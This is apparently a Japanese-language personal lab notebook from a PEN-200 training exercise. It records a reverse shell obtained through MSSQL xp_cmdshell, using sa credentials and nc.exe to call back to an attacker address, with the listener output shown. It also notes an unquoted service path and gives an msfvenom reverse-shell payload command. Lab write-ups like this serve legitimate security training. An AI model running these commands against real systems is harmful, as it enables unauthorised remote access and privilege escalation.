- SigmaPotatoおよびPrintSpooferは動作しない
	- Spoolerサービスが停止しているから？

- mssqlユーザーでシェル獲得してみる
```powershell
sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "EXECUTE xp_cmdshell 'C:\Users\Public\nc.exe 192.168.45.227 1337 -e cmd.exe';"
```
```sh
┌──(koshi㉿kali)-[~/PEN-200/Skylark/VM18]
└─$ sudo rlwrap nc -lvnp 1337  
[sudo] password for koshi: 
listening on [any] 1337 ...
connect to [192.168.45.227] from (UNKNOWN) [192.168.141.226] 63859
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssqlserver

C:\Windows\system32>
```

- C:\SQL2022は閲覧できない

- mssqlもSeImpersonatePrivilegeをもっているがSigmaPotatoとPrintSpooferは失敗する
	- →なぜ？

---

==discord==みた
→サービスエクスプロイトとの回答があった

---

# Service 

## DevService

- Unquoted Serviceなので、[[💥Windows Privilege Escalation#Service Exploits - Unquoted Service Path]]を使う
- 自分のグループ（BUILTIN\Users）は、`C:\Skylark\Development Binaries 01`にデータの追記、書き込みが可能

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=<Port> -f exe-service -o [output.exe]
```

